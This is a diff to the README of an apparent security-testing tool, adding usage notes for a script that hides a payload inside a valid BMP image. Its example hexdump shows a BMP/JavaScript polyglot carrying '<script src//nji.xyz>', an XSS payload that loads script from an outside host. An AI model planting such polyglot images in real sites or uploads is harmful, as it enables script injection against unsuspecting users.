@@ -24,6 +24,44 @@ sudo apt install libgd-perl libimage-exiftool-perl libtext-string-hexconvert-per
 
 ## TOOLS
 
+### bmp-all.pl
+
+Create payload as a legitim `BMP` image.
+
+##### Usage
+
+```sh
+./bmp-all.pl [-payload 'STRING'] -output payload.bmp
+
+If the output file exists, then the payload will be injected into the
+existing file.  Else the new one will be created.
+```
+
+##### Example
+
+```sh
+
+[>|        JPEG Tags ~ Payload Creator      |<]
+
+    https://github.com/chinarulezzz/pixload
+
+
+[>] Generating output file
+[✔] File saved to: payload.bmp
+
+[>] Injecting payload into payload.bmp
+[✔] Payload was injected successfully
+
+payload.bmp: PC bitmap, OS/2 1.x format, 1 x 1
+
+00000000  42 4d 2f 2a 00 00 00 00  00 00 1a 00 00 00 0c 00  |BM/*............|
+00000010  00 00 01 00 01 00 01 00  18 00 00 00 ff 00 2a 2f  |..............*/|
+00000020  3d 31 3b 3c 73 63 72 69  70 74 20 73 72 63 2f 2f  |=1;<script src//|
+00000030  6e 6a 69 2e 78 79 7a 3e  3c 2f 73 63 72 69 70 74  |nji.xyz></script|
+00000040  3e 3b                                             |>;|
+00000042
+```
+
 ### gif-all.pl
 
 Create payload as a legitim `GIF` image.
